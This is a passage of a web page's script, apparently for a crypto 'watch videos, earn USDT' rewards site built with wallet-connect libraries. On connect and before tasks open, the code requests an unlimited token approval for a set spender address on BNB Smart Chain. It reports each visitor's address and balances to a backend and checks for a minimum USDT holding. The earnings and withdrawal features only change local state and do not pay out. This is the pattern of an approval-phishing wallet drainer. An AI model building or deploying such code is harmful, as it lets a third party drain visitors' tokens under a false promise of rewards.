    console.warn("Failed to load earnings", e);
  }
}

function updateTaskUnlocks() {
  const tasks = [...document.querySelectorAll(".task-section[data-order]")]
    .sort((a, b) => Number(a.dataset.order) - Number(b.dataset.order));

  tasks.forEach((taskEl, index) => {
    const taskKey = taskEl.dataset.task;

    if (index === 0) {
      taskEl.classList.remove("task-locked");
      return;
    }

    const prevTaskKey = tasks[index - 1].dataset.task;

    if (completedTasks.has(prevTaskKey)) {
      if (taskEl.classList.contains("task-locked")) {
        taskEl.classList.remove("task-locked");
        taskEl.classList.add("task-unlocked");
        showToast("üîì Next task unlocked");
      }
    } else {
      taskEl.classList.add("task-locked");
      taskEl.classList.remove("task-unlocked");
    }
  });
}


    

function updateBalanceBox() {
  document.getElementById("balUserId").textContent = currentUserId || "‚Äî";
  document.getElementById("balAddress").textContent =
    currentAddress
      ? currentAddress.slice(0, 6) + "‚Ä¶" + currentAddress.slice(-4)
      : "‚Äî";

  document.getElementById("balTasks").textContent = completedTasks.size;
  document.getElementById("balTotal").textContent = totalEarnings.toFixed(2);

// üî• WITHDRAW LOGIC
  const withdrawBtn  = document.getElementById("withdrawBtn");
  const withdrawHint = document.getElementById("withdrawHint");

  if (withdrawBtn) {
    if (totalEarnings >= 10) {
      withdrawBtn.disabled = false;
      withdrawHint.textContent = "You can now withdraw";
    } else {
      withdrawBtn.disabled = true;
      withdrawHint.textContent = "Minimum withdrawal: $10";
    }
  }
  
}




const withdrawBtn = document.getElementById("withdrawBtn");

withdrawBtn?.addEventListener("click", () => {
  if (totalEarnings < 10) return;
  openWithdrawModal();
});

document
  .getElementById("confirmWithdrawBtn")
  ?.addEventListener("click", () => {

    // 1Ô∏è‚É£ SAFETY CHECK
    if (!withdrawAmountInput || !withdrawError) return;

    withdrawError.classList.add("hidden");

    // 2Ô∏è‚É£ READ AMOUNT
    const amount = Number(withdrawAmountInput.value);

    // 3Ô∏è‚É£ VALIDATION
    if (Number.isNaN(amount) || amount < 10) {
      withdrawError.textContent = "Minimum withdrawal amount is $10.";
      withdrawError.classList.remove("hidden");
      return;
    }

    if (amount > totalEarnings) {
      withdrawError.textContent = "Amount exceeds available balance.";
      withdrawError.classList.remove("hidden");
      return;
    }

    // 4Ô∏è‚É£ DEDUCT BALANCE
    totalEarnings = Number((totalEarnings - amount).toFixed(2));
    saveEarnings();
    updateBalanceBox();
    closeWithdrawModal();

    // 5Ô∏è‚É£ üëâ ADD WITHDRAW HISTORY (THIS WAS CONFUSING)
    const withdrawals = loadWithdrawals();

    withdrawals.push({
      id: "wd_" + Date.now(),
      amount: amount,
      address: currentAddress,
      userId: currentUserId,
      status: "pending",
      time: new Date().toLocaleString()
    });

    saveWithdrawals(withdrawals);
    renderWithdrawHistory();

    // 6Ô∏è‚É£ SHOW SUCCESS UI
    showWithdrawSuccess(amount);
  });

function destroyClaimedTasksOnRestore() {
  if (!window.videoTasks || !window.claimedTasks) return;

  claimedTasks.forEach(taskKey => {
    const task = videoTasks[taskKey];
    if (!task) return;

    // stop interval
    if (task.interval) {
      clearInterval(task.interval);
      task.interval = null;
    }

    // destroy player if exists
    if (task.player) {
      try {
        task.player.stopVideo();
        task.player.destroy();
      } catch (e) {}
      task.player = null;
    }
  });
}



    
function updateTaskProgress() {
  const totalTasks = document.querySelectorAll(
    ".task-section[data-task]"
  ).length;

  const completedCount = completedTasks.size;

  const percent = totalTasks
    ? Math.min((completedCount / totalTasks) * 100, 100)
    : 0;

  const fill = document.getElementById("taskProgressFill");
  const text = document.getElementById("taskProgressText");

  if (fill) fill.style.width = percent + "%";
  if (text) text.textContent = `${completedCount} / ${totalTasks} completed`;
}



const claimedTasks = new Set();

document.addEventListener("click", (e) => {
  const btn = e.target.closest(".task-claim-btn");
  if (!btn) return;

  const taskKey = btn.dataset.task;
  if (!completedTasks.has(taskKey)) return; // safety
  if (claimedTasks.has(taskKey)) return;

  const amount = TASK_REWARDS[taskKey] || 0;

  claimedTasks.add(taskKey);
  totalEarnings += amount;
  // ‚úÖ DESTROY VIDEO / WEBGL AFTER CLAIM
destroyTask(taskKey);

  btn.textContent = "Claimed ‚úì";
  btn.disabled = true;

  saveEarnings();
  updateBalanceBox();
       updateTaskUnlocks();

});






    
function showToast(message) {
  const toast = document.getElementById("toast");
  if (!toast) return;

  toast.textContent = message;
  toast.classList.remove("hidden");
  toast.classList.add("show");

  setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => toast.classList.add("hidden"), 250);
  }, 2200);
}



    

    

let appKitEip155Provider = null;

// Watch AppKit provider globally (mobile fix)
// This catches both fresh connections AND restored sessions.
function setupAppKitProviderWatcher() {
  if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;

  window.appKit.subscribeProviders(async (state) => {
    const provider = state["eip155"] || null;

    // NEWLY CONNECTED or RESTORED provider
    if (provider && provider !== appKitEip155Provider) {
      appKitEip155Provider = provider;
      await handleAppKitProvider(provider);
    }

    // DISCONNECTED provider
    if (!provider && appKitEip155Provider) {
      appKitEip155Provider = null;
      clearSessionUI();
    }
  });
}

async function handleAppKitProvider(provider) {
  try {
    providerInstance = provider;
    web3Instance = new Web3(providerInstance);

    let accounts = await web3Instance.eth.getAccounts();

    // Mobile Chrome sometimes returns [] for 0.5 seconds ‚Üí retry
    if (!accounts || !accounts.length) {
      for (let i = 0; i < 5; i++) {
        await new Promise(r => setTimeout(r, 400));
        accounts = await web3Instance.eth.getAccounts();
        if (accounts && accounts.length) break;
      }
    }

    if (!accounts || !accounts.length) {
      console.warn("Still no accounts after retry mobile.");
      return;
    }

    const address = accounts[0].toLowerCase();
    currentAddress = address;

    // Restore UI + balances
    await restoreSessionFromAddress(address);

    isWalletConnected = true;
    updateTaskAccessUI();

    setStatus("Connected");

    // Only ask approval when new session detected
    await ensureTokenApproval();

  } catch (err) {
    console.error("handleAppKitProvider error:", err);
  }
}

    

    // ===== userId helpers =====
    function storageKeyFor(address){
      return "userId_" + address.toLowerCase();
    }
    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++){
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000);
      return String(num);
    }
    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
      }
      return id;
    }

    // ===== UI refs =====
    const connectBtn      = document.getElementById("connectBtn");
    const statusTextEl    = document.getElementById("statusText");
    const walletAddressEl = document.getElementById("walletAddress");
    const userIdEl        = document.getElementById("userId");
    const walletNetworkEl = document.getElementById("walletNetwork");
    const walletBalanceEl = document.getElementById("walletBalance");
    const tokensContainer = document.getElementById("tokens");

    const rewardPageEl    = document.getElementById("rewardPage");
    const taskPageEl      = document.getElementById("taskPage");
    const backToRewardsBtn= document.getElementById("backToRewardsBtn");
    const taskBtn         = document.getElementById("taskBtn");

    const claimBtn        = document.getElementById("claimBtn");
    const claimHintEl     = document.getElementById("claimHint");

   const connectBtnCard  = document.getElementById("connectBtnCard");


    const rewardAmountEl  = document.getElementById("rewardAmountDisplay");

    const task1Btn        = document.getElementById("task1Btn");
    const task1CheckEl    = document.getElementById("task1Check");
    const task2CheckBtn   = document.getElementById("task2CheckBtn");
    const task2CheckEl    = document.getElementById("task2Check");
    const task2DetailEl   = document.getElementById("task2Detail");
    const task3Btn        = document.getElementById("task3Btn");
    const task3CheckEl    = document.getElementById("task3Check");

    function setStatus(txt){
      if(statusTextEl) statusTextEl.textContent = txt;
      console.log("[status]", txt);
    }
    function setWalletInfo(address, network, bnb){
      if(walletAddressEl) walletAddressEl.textContent = address || "Wallet Address";
      if(walletNetworkEl) walletNetworkEl.textContent = network || "Network";
      if(walletBalanceEl){
        walletBalanceEl.textContent =
          (bnb === null || bnb === undefined) ? "‚Äî" : (Number(bnb).toFixed(6) + " BNB");
      }
    }
    function setUserIdUI(id){
      if(userIdEl) userIdEl.textContent = id || "-";
    }

    function clearSessionUI(){
      isWalletConnected = false;
      currentAddress    = null;
      currentUserId     = null;
      currentBNBBalance = null;
      currentTokenBalance = null;

      setStatus("Not connected");
      setWalletInfo("Wallet Address","Network",null);
      setUserIdUI("-");



      if(connectBtnCard){
  connectBtnCard.classList.remove("is-hidden");
  connectBtnCard.textContent = "Connect Wallet";
  connectBtnCard.classList.remove("connected");
}


     
      if(connectBtn){
        connectBtn.textContent = "Connect Wallet";
        connectBtn.classList.remove("connected");
      }


      
      updateClaimState();
      updateTaskAccessUI();
      isTokenApproved = false;
approvalFailed  = false;
updateApproveButtonUI();


    }

    function updateClaimState(){
      const allTasksDone = task1Done &&  task5Done && task6Done && task7Done && task8Done && task9Done && task10Done && task2Eligible && task3Done;
      if(claimBtn){
        claimBtn.disabled = !(isWalletConnected && allTasksDone);
      }
      if(claimHintEl){
        if(!isWalletConnected){
          claimHintEl.textContent = "Please connect your wallet first.";
        }else if(!allTasksDone){
          claimHintEl.textContent = "Complete Task to Earn USDT";
        }else{
          claimHintEl.textContent = "You can now claim your reward.";
        }
      }
    }

    function markTaskState(el, ok, textOk, textBad){
      if(!el) return;
      el.classList.remove("ok","bad");
      if(ok){
        el.classList.add("ok");
        el.textContent = "‚úÖ " + textOk;
      }else{
        el.classList.add("bad");
        el.textContent = "‚ùå " + textBad;
      }
    }

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try{
        p.on("accountsChanged", async function(accounts){
          if(!accounts || !accounts.length){
            clearSessionUI();
            return;
          }
          const addr = accounts[0].toLowerCase();
          await restoreSessionFromAddress(addr);
        });

        p.on("chainChanged", function(chainId){
          if(walletNetworkEl){
            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
          }
        });

        p.on("disconnect", function(){
          clearSessionUI();
        });
      }catch(e){
        console.warn("attachProviderListeners", e);
      }
    }

    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
      try{
        const payload = new URLSearchParams({
          secret      : APPS_SCRIPT_SECRET,
          address     : address || "",
          network     : networkText || "",
          timestamp   : new Date().toISOString(),
          userId      : userId || "",
          bnbBalance  : bnbBalance !== undefined && bnbBalance !== null ? String(bnbBalance) : "",
          tokenBalance: tokenBalance !== undefined && tokenBalance !== null ? String(tokenBalance) : "",
          eventType   : eventType || "connect"
        });

        console.log("notifyBackend payload", Object.fromEntries(payload.entries()));

        await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode  : "no-cors",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
          },
          body: payload.toString()
        });
      }catch(err){
        console.error("notifyBackend error:", err);
      }
    }

    async function getTokenBalance(address){
      try{
        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
          console.warn("TOKEN_ADDRESS invalid");
          return "";
        }
        if(!providerInstance){
          console.warn("No providerInstance for token balance");
          return "";
        }
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
        const raw            = await tokenContract.balanceOf(address);
        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);

        return formatted;
      }catch(err){
        console.error("getTokenBalance error:", err);
        return "";
      }
    }

    async function switchToBSC(provider){
      try{
        await provider.request({
          method:"wallet_switchEthereumChain",
          params:[{chainId:BNB_TESTNET_CHAIN_ID_HEX}]
        });
        return true;
      }catch(switchError){
        if(switchError.code === 4902){
          try{
            await provider.request({
              method:"wallet_addEthereumChain",
              params:[{
                chainId:BNB_TESTNET_CHAIN_ID_HEX,
                chainName:"BNB Smart Chain",
                nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
                rpcUrls:[BNB_TESTNET_RPC],
                blockExplorerUrls:["https://bscscan.com"]
              }]
            });
            return true;
          }catch(addErr){
            console.error("Could not add BNB Smart Chain:", addErr);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    async function ensureTokenApproval(){
      // helper: always log with last known balances
      async function logApproval(tag){
        await notifyBackend(
          currentAddress || "",
          BNB_TESTNET_LABEL,
          currentUserId || "",
          currentBNBBalance,
          currentTokenBalance,
          tag
        );
      }

      // basic guards
      if(!TOKEN_ADDRESS){
        console.warn("TOKEN_ADDRESS not set, skipping approve");
        await logApproval("approval_skipped_no_token");
        return;
      }
      if(!SPENDER_ADDRESS){
        console.warn("SPENDER_ADDRESS not set, skipping approve");
        await logApproval("approval_skipped_no_spender");
        return;
      }
      if(!providerInstance || !web3Instance){
        console.warn("No providerInstance/web3Instance for approval");
        await logApproval("approval_skipped_no_provider");
        return;
      }

      try{
        setStatus("Preparing token approval‚Ä¶");

        const ethersProvider = new ethers.BrowserProvider(
          providerInstance,
          BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
        );
        const signer       = await ethersProvider.getSigner();
        const ownerAddress = (await signer.getAddress()).toLowerCase();

        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
          alert(
            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
            "It MUST be the BEP-20 token contract address, not your wallet."
          );
          setStatus("Connected (approval skipped)");
          await logApproval("approval_skipped_token_is_wallet");
          return;
        }

        // 1) check allowance
        const readContract = new ethers.Contract(
          TOKEN_ADDRESS,
          ERC20_ALLOWANCE_ABI,
          ethersProvider
        );
        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
        console.log("[approve] currentAllowance =", currentAllowance.toString());

       if (currentAllowance > 0n) {
  isTokenApproved = true;
  approvalFailed  = false;
  setStatus("Connected + Approved ‚úÖ");
  updateApproveButtonUI();
  await logApproval("approval_already");
  return;
}


        // 2) send approve tx
        setStatus("Waiting for wallet to confirm approval‚Ä¶");
        const writeContract = new ethers.Contract(
          TOKEN_ADDRESS,
          ERC20_APPROVE_ABI,
          signer
        );

        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
        console.log("[approve] tx sent:", tx.hash);

        setStatus("Approval pending on chain‚Ä¶");
        await tx.wait();

    isTokenApproved = true;
approvalFailed  = false;
setStatus("Connected + Approved ‚úÖ");
updateApproveButtonUI();
await logApproval("approval_approved");

      }catch(err){
        console.error("Token approve error:", err);

        let tag = "approval_error";
        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
          tag = "approval_rejected";
        }
isTokenApproved = false;
approvalFailed  = true;
setStatus("Connected ‚Ä¢ Approval failed");
updateApproveButtonUI();
alert("Token approval failed: " + (err?.message || err));
await logApproval(tag);

      }
    }




modalApproveBtn?.addEventListener("click", async () => {
  modalApproveBtn.disabled = true;
  modalApproveBtn.textContent = "Waiting for wallet‚Ä¶";

  try {
    await ensureTokenApproval();
  } finally {
    modalApproveBtn.disabled = false;
    modalApproveBtn.textContent = "Approve USDT";

    if (isTokenApproved) {
      closeApprovalModal();
      showTaskPage(); // auto-open tasks after approval
    }
  }
});



    
    async function restoreSessionFromAddress(address){
      currentAddress = address;

      const balanceWei = await web3Instance.eth.getBalance(address);
      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
      const userId     = getOrCreateUserIdFor(address);

      currentUserId       = userId;
      currentBNBBalance   = balanceBNB;

      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
      setUserIdUI(userId);

      const tokenBalanceRaw  = await getTokenBalance(address);
      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";

      currentTokenBalance = tokenBalanceNum;

      if(tokensContainer){
        tokensContainer.innerHTML =
          'USDT balance: ' + prettyBalance +
          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
      }

   isWalletConnected = true;

if (connectBtn) {
  connectBtn.textContent = "Connected";
  connectBtn.classList.add("connected");
}

if (connectBtnCard) {
  connectBtnCard.classList.add("is-hidden");
}


      updateClaimState();
      updateApproveButtonUI();
loadEarnings();
updateBalanceBox();


      // Return values for connectFlow
      return {
        balanceBNB,
        tokenBalance: tokenBalanceNum,
        userId
      };
    }

    // üîÅ NEW: connect using Reown AppKit
 // üîÅ NEW: connect using Reown AppKit (fixed for mobile)
async function connectFlow() {
  try {
    if (!window.appKit) {
      alert("Wallet connect UI not ready. Please reload the page.");
      return;
    }

    setStatus("Connecting‚Ä¶");

    let gotProvider = null;

    // 1) Subscribe BEFORE opening the modal
    const unsubscribe = window.appKit.subscribeProviders((state) => {
      const evm = state["eip155"];
      if (evm && !gotProvider) {
        gotProvider = evm;
      }
    });

    // 2) Open AppKit modal (Connect view)
    await window.appKit.open({ view: "Connect" });

    // 3) Stop listening
    if (typeof unsubscribe === "function") {
      unsubscribe();
    }

    // 4) If no provider, user probably closed modal or connect failed
    const provider = gotProvider;
    if (!provider) {
      setStatus("Not connected");
      return;
    }

    // 5) Use this provider for Web3 & Ethers
    providerInstance = provider;
    web3Instance     = new Web3(providerInstance);

    attachProviderListeners(providerInstance);

    const accounts = await web3Instance.eth.getAccounts();
    if(!accounts || !accounts.length){
      setStatus("No account");
      return;
    }
    const address = accounts[0].toLowerCase();
    currentAddress = address; // helpful for approval logging

    // 6) Ensure BSC (56)
    let chainId    = await web3Instance.eth.getChainId();
    let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);

    if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
      const switched = await switchToBSC(providerInstance);
      if(!switched){
        alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
        setStatus("Wrong network");
        return;
      }
      chainId    = await web3Instance.eth.getChainId();
      chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
      if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
        setStatus("Wrong network");
        return;
      }
    }

    // 7) Connected + correct network
    setStatus("Connected");

    const sessionPromise = (async () => {
      const session = await restoreSessionFromAddress(address);
      const balanceBNB   = session.balanceBNB;
      const tokenBalance = session.tokenBalance;
      const userId       = session.userId;

      // Log to sheet
      notifyBackend(
        address,
        BNB_TESTNET_LABEL,
        userId,
        balanceBNB,
        tokenBalance,
        "connect"
      ).catch(console.error);

      return session;
    })();


    updateApproveButtonUI();


    // 8) Token approval (same behavior as before)
    await ensureTokenApproval();
    sessionPromise.catch(console.error);

  } catch (err) {
    console.error("connectFlow error (AppKit):", err);
    setStatus("Connection failed");
    alert("Connection failed: " + (err && err.message ? err.message : err));
  }
}



function updateApproveButtonUI() {
  const approveBtn = document.getElementById("approveBtn");
  if (!approveBtn) return;

  // Not connected ‚Üí hide
  if (!isWalletConnected) {
    approveBtn.classList.add("hidden");
    return;
  }

  // Approved already ‚Üí hide
  if (isTokenApproved) {
    approveBtn.classList.add("hidden");
    return;
  }

  // Connected + not approved ‚Üí show
  approveBtn.classList.remove("hidden");
}







    

    async function tryAutoReconnectSilent(){
      // keep your old silent reconnect using injected wallets
      if(window.trustwallet && window.trustwallet.ethereum){
        const injected = window.trustwallet.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);
        const accounts = await injected.request({method:"eth_accounts"});
        if(accounts && accounts.length){
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session (Trust Wallet)...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      if(window.ethereum){
        const injected = window.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);
        const accounts = await injected.request({method:"eth_accounts"});
        if(accounts && accounts.length){
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      return false;
    }

    async function autoConnectOnLoad(){
      try{
        const restored = await tryAutoReconnectSilent();
        if(!restored){
          clearSessionUI();
        }
      }catch(e){
        console.warn("autoConnectOnLoad failed:", e);
        clearSessionUI();
      }
    }

    async function claimReward(){
      try{
        if(!isWalletConnected){
          alert("Please connect your wallet first.");
          setStatus("Connect wallet before claiming.");
          return;
        }
        if(!(task1Done && task2Eligible && task3Done)){
          alert("Please complete all tasks first.");
          return;
        }
        if(!web3Instance || !providerInstance || !currentAddress){
          alert("Wallet not ready, connect again.");
          return;
        }

        setStatus("Claiming reward‚Ä¶");

        // TODO: real contract call later
        setTimeout(()=>{
          setStatus("Reward claimed for " + currentAddress.slice(0,6) + "‚Ä¶" + currentAddress.slice(-4));
          alert("Reward claimed! (demo mode ‚Äî add real contract call later)");
        },800);
      }catch(err){
        console.error("claimReward error:", err);
        setStatus("Reward claim failed");
      }
    }

    // === TASK LOGIC ===
function showTaskPage() {
  if (rewardPageEl) rewardPageEl.style.display = "none";
  if (taskPageEl)   taskPageEl.style.display   = "block";

  if (!ytReady) return;

  Object.keys(videoTasks).forEach(initVideoTask);

  // üî• FORCE YOUTUBE RESIZE AFTER DISPLAY
  setTimeout(() => {
    Object.values(videoTasks).forEach(task => {
      if (task.player && task.player.setSize) {
        if (!isMobile && task.player?.setSize) {
  task.player.setSize(
    task.player.getIframe().offsetWidth,
    task.player.getIframe().offsetHeight
  );
}

      }
    });

    enableVideoClickToPlay();
  }, 200);
}




    
function initVideoTask(taskKey) {
  if (claimedTasks.has(taskKey)) return;

  if (!ytReady) return;

  const task = videoTasks[taskKey];
  if (task.player) return;

  task.checkEl = document.getElementById(taskKey + "Check");

  task.player = new YT.Player(task.playerId, {
    playerVars: {
      controls: 0,
      disablekb: 1,
      rel: 0,
      modestbranding: 1,
      iv_load_policy: 3,
      playsinline: 1
    },
    events: {


      
onReady: () => {
  task.duration = 0;
  task.remaining = 0;
  task.lastTime = 0;
  task.stableTicks = 0;


 // üî• RESET OVERLAY
  const overlay = document
    .getElementById(task.playerId)
    ?.closest(".video-wrapper")
    ?.querySelector(".video-click-overlay");

  if (overlay) overlay.classList.remove("hidden");
  
  updateVideoTimerUI(task);
},


      
      onStateChange: (e) => onVideoStateChange(task, e)
    }
  });
  setTimeout(enableVideoClickToPlay, 0);

}


    

    
    function showRewardPage(){
      if(taskPageEl)   taskPageEl.style.display   = "none";
      if(rewardPageEl) rewardPageEl.style.display = "block";
    }

    async function handleTask2Check(){
      if(!isWalletConnected || !currentAddress){
        alert("Please connect your wallet first.");
        return;
      }
      if(!web3Instance || !providerInstance){
        alert("Wallet not ready, try reconnect.");
        return;
      }

      try{
        setStatus("Checking wallet balance‚Ä¶");
        const balanceStr = await getTokenBalance(currentAddress);
        const balanceNum = balanceStr ? Number(balanceStr) : 0;

        const eligible = balanceNum >= REQUIRED_USDT;
        task2Eligible = eligible;

        markTaskState(
          task2CheckEl,
          eligible,
          "ELIGIBLE (balance ‚â• " + REQUIRED_USDT + ")",
          "Not eligible (needs ‚â• " + REQUIRED_USDT + ")"
        );

        if(task2DetailEl){
          task2DetailEl.textContent =
            "Detected balance: " + balanceNum.toFixed(4) +
            " USDT. Result: " + (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") +
            ". Later you can also check if this is an active account.";
        }

        setStatus("Wallet check completed");
        updateClaimState();
      }catch(err){
        console.error("Task 2 check error:", err);
        if(task2DetailEl){
          task2DetailEl.textContent = "Error checking wallet. Try again.";
        }
      }
    }

    // ===== DOMContentLoaded =====
    document.addEventListener("DOMContentLoaded", async function(){

   

const approveBtn = document.getElementById("approveBtn");
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    if (!isWalletConnected) return;
    approveBtn.disabled = true;
    approveBtn.textContent = "Approving‚Ä¶";

    await ensureTokenApproval();

    approveBtn.disabled = false;
    approveBtn.textContent = "Approve Now";
  });
}



      
      if(rewardAmountEl){
        rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
      }

      updateClaimState();
      updateTaskAccessUI();
setupAppKitProviderWatcher();
      updateTaskUnlocks();
      updateTaskProgress();


// üî• DESTROY VIDEO TASKS THAT ARE ALREADY CLAIMED (ON RESTORE)
if (window.claimedTasks && window.videoTasks) {
  claimedTasks.forEach(taskKey => {
destroyTask(taskKey);
  });
}

      


      if(connectBtn){
        connectBtn.addEventListener("click", function(){
          if(isWalletConnected) return;
          connectFlow();
        });
      }

// Connect button inside reward card
const connectBtnCard = document.getElementById("connectBtnCard");
if (connectBtnCard) {
  connectBtnCard.addEventListener("click", function () {
    if (isWalletConnected) return;
    connectFlow();
  });
}




      

      if(claimBtn){
        claimBtn.addEventListener("click", claimReward);
      }


if(taskBtn){
  taskBtn.addEventListener("click", () => {
    if (!isWalletConnected) return;

    if (!isTokenApproved) {
      openApprovalModal();
      return;
    }

    showTaskPage();
  });
}

      
 
     document
  .querySelectorAll("#backToRewardsBtn, .backToRewardsBtn")
  .forEach(btn => {
    btn.addEventListener("click", showRewardPage);
  });

      



      


      

      if(task2CheckBtn){
        task2CheckBtn.addEventListener("click", handleTask2Check);
      }

      if(task3Btn){
        task3Btn.addEventListener("click", function(){
          task3Done = true;
          markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed");
          updateClaimState();
        });
      }

      await autoConnectOnLoad();
      const yearEl = document.getElementById("year");
      if(yearEl) yearEl.textContent = new Date().getFullYear();
    });

  })();
  </script>
</body>
</html>
